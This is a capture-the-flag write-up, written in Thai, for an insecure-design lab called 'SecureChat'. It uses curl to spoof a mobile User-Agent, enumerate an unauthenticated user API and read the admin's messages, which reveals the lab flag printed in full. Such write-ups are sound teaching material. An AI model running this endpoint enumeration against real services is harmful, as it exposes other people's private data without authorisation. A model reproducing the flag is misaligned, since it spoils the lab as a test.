# AS01: Insecure Design (Mobile-Only Assumption)

Target: http://10.48.162.251:5005  
Flag: `THM{1NS3CUR3_D35IGN_4SSUMPT10N}`

---

## 1. บทนำ

แลปนี้เป็นการฝึกทดสอบช่องโหว่ประเภท `Insecure Design` ซึ่งเกิดจากการออกแบบระบบโดยมีสมมติฐานที่ผิดพลาด  
ระบบ SecureChat ถูกออกแบบโดยเชื่อว่ามีเพียง Mobile Application เท่านั้นที่สามารถเข้าถึง Backend API ได้  
แต่ไม่ได้มีการบังคับใช้การยืนยันตัวตน (Authentication) และการกำหนดสิทธิ์ (Authorization) ที่ฝั่ง server อย่างเหมาะสม

---

## 2. สิ่งที่พบจากหน้าเว็บ

เมื่อเข้าถึงหน้าเว็บหลักของระบบ จะพบหน้า Landing Page ที่แสดงข้อความดังนี้

`SecureChat is designed exclusively for mobile devices.`

จากการตรวจสอบเบื้องต้นพบว่า:
- ระบบตอบกลับ HTTP request ตามปกติ
- ไม่มีการบังคับ login หรือ token ใด ๆ
- ไม่มีการ block การเข้าถึงจาก browser

สิ่งนี้แสดงให้เห็นว่าระบบอาศัยเพียง “สมมติฐาน” ว่าผู้ใช้จะเป็น mobile client แทนการบังคับใช้ security control จริง

---

## 3. การทดสอบสมมติฐาน Mobile-Only

เนื่องจาก Mobile Application ใช้ HTTP protocol เช่นเดียวกับ browser  
จึงทำการปลอม User-Agent เพื่อทดสอบว่าระบบแยก client อย่างไร

```bash
curl -i -H "User-Agent: SecureChat/1.0 (Android)" http://10.x.x.x:5005/
```

ผลลัพธ์ที่ได้:

- Server ตอบกลับด้วย 200 OK
- ไม่มีการตรวจสอบเพิ่มเติม
- Backend ยอมรับ request จาก client ที่ระบุว่าเป็น mobile

แสดงให้เห็นว่าระบบเชื่อถือข้อมูลจากฝั่ง client ซึ่งถือเป็น Insecure Design

---

## 4. การ Enumerate API Endpoint

Mobile application โดยทั่วไปจะสื่อสารกับ backend ผ่าน API จึงทำการทดสอบ endpoint ที่พบบ่อยในระบบลักษณะนี้

```bash
curl -i http://10.x.x.x:5005/api/users
```

ผลลัพธ์ที่ได้:
- ได้ 200 OK
- ระบบเปิดเผยข้อมูลผู้ใช้ทั้งหมด รวมถึงผู้ใช้ระดับ admin
- ไม่มีการยืนยันตัวตนก่อนเข้าถึงข้อมูล

```bash
{
    "admin": {
        "email": "admin@example.com",
        "name": "Admin",
        "role": "admin"
    },
    "user1": {
        "email": "alice@example.com",
        "name": "Alice",
        "role": "user"
    },
    "user2": {
        "email": "bob@example.com",
        "name": "Bob",
        "role": "user"
    }
}
```

จากข้อมูลนี้สามารถยืนยันได้ว่าระบบไม่มีการควบคุมสิทธิ์ในการเข้าถึง API

---

## 5. การวิเคราะห์ Message Endpoint

จากชื่อแอป SecureChat และข้อมูลผู้ใช้ที่ถูกเปิดเผย สามารถสันนิษฐานได้ว่า message ถูกผูกกับ user ตามรูปแบบ REST API

เมื่อทดสอบ endpoint รวมดังนี้

```bash
curl -i http://10.x.x.x:5005/api/messages
```

ระบบตอบกลับด้วย 404 Not Found ซึ่งบ่งชี้ว่า messages น่าจะถูกเข้าถึงผ่าน path ในรูปแบบ /api/messages/<username>

---

# 6. การเข้าถึงข้อมูลของ Admin โดยไม่ได้รับอนุญาต

จากรายชื่อผู้ใช้ที่ได้จาก /api/users จึงทำการทดสอบเข้าถึง messages ของผู้ใช้ระดับ admin โดยตรง

```bash
curl -i http://10.x.x.x:5005/api/messages/admin
```

ผลลัพธ์:

- ได้ 200 OK
- สามารถเข้าถึงข้อความของ admin ได้โดยไม่ต้องยืนยันตัวตน
- พบข้อมูลสำคัญใน message

```bash
{
    "messages": [
        {
        "from": "system",
        "content": "Admin panel access key: THM{1NS3CUR3_D35IGN_4SSUMPT10N}"
        }
    ],
    "user": "admin"
}
```
## 7. Flag ที่ได้

จากการเข้าถึงข้อความของ admin ทำให้ได้ flag ดังนี้

`THM{1NS3CUR3_D35IGN_4SSUMPT10N}`

## 8. สรุปสิ่งที่ได้เรียนรู้

- การออกแบบระบบโดยเชื่อถือพฤติกรรมของ client เป็น Insecure Design
- User-Agent ไม่ควรถูกใช้เป็นกลไกด้านความปลอดภัย
- Role ที่อยู่ในข้อมูลแต่ไม่ถูก enforce ไม่มีความหมายด้าน security
- ช่องโหว่ด้าน design ไม่สามารถแก้ไขได้ด้วย patch เพียงอย่างเดียว แต่ต้องปรับโครงสร้างระบบใหม่